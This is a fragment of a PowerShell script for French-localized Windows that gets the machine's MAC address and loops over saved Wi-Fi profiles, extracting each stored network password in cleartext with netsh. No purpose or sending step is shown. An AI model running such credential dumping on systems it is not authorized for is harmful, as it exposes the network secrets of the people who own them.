...
$MAC = ipconfig /all | Select-String -Pattern "physique" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
}
...
Foreach($WLANProfileName in $WLANProfileNames){
    ...
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "clé") -split ":")[1]).Trim()
    }Catch{
